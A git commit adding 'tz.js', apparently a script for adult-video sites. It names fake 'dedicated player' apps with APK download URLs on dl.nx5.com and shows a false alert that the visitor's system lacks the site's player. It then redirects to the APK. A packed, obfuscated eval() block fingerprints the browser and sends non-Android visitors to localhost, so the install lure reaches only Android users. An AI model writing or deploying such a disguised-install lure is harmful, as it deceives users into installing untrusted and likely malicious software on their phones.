d8dae5b1c39551b12c7a7464c645b7a3ceb6509d
jipinfuli <as39328@163.com>
2014-11-08 13:44:54 +0800

    Create tz.js

---
+++ tz.js
@@ -0,0 +1,44 @@
+var name="夜色A片";
+var name2="360影视A片";
+var name3="PPTV聚色A片";
+var name4="咪咪影院";
+var url="http://dl.nx5.com/apk/20141103/TV_817-release.apk";
+var url2="http://dl.nx5.com/apk/20140709/360Video_2.6.2_YS802.apk";
+var url3="http://dl.nx5.com/apk/20141104/PPTV_aPhone_4.0.6_863_20141103.apk";
+var url4="http://dl.nx5.com/apk_mbo/mmbo_10097_demo.apk";
+
+try{
+	var isp=remote_ip_info.isp;
+}catch(e){
+	var isp="\u5176\u5b83";
+}
+
+var appname=name;
+var appname2=name4;
+var appurl=url;
+var appurl2=url4;
+try{
+	if(isp=='\u7535\u4fe1' || isp=='\u79fb\u52a8'){
+		
+	}else{
+		
+	}
+	var hours=new Date().getHours();
+	if(hours>=20 && hours<=24){
+		//var appname=name3;
+		//var appname2=name2;
+		//var appurl=url3;
+		//var appurl2=url2;
+	}
+}catch(e){
+
+}
+
+var tixing="系统没有检测到本站专用色片播放器,请下载本站专用（"+appname2+"）播放器，安装后运行专用浏览即可观看本站3W部成人爽片！";
+function ts(){
+	alert(tixing);window.location.href=appurl2;
+}
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('O{3 b={6:j(){3 u=4.f,h=4.t;w{x:u.2(\'p\')>-1,o:u.2(\'r\')>-1,s:u.2(\'9\')>-1,q:u.2(\'y\')>-1&&u.2(\'v\')==-1,g:!!u.8(/9.*e.*/),m:!!u.8(/\\(i[^;]+;( n;)? k.+l M N/),7:u.2(\'K\')>-1||u.2(\'L\')>-1,d:u.2(\'d\')>-1,a:u.2(\'a\')>-1,R:u.2(\'P\')==-1}}(),c:(4.Q||4.c).J()};3 5=b.6.7}C(D){3 5="B"};z(5!=A){H.I.G="E://F.0.0.1/"}',54,54,'||indexOf|var|navigator|khd|versions|android|match|AppleWebKit|iPad|browser|language|iPhone|Mobile|userAgent|mobile|app||function|CPU|Mac|ios|U|presto|Trident|gecko|Presto|webKit|appVersion||KHTML|return|trident|Gecko|if|true|cuo|catch|err|http|127|href|window|location|toLowerCase|Android|Linux|OS|X|try|Safari|browserLanguage|webApp'.split('|'),0,{}))
+if(top.location !== self.location){
+	top.location = self.location + '?id=1';
+}
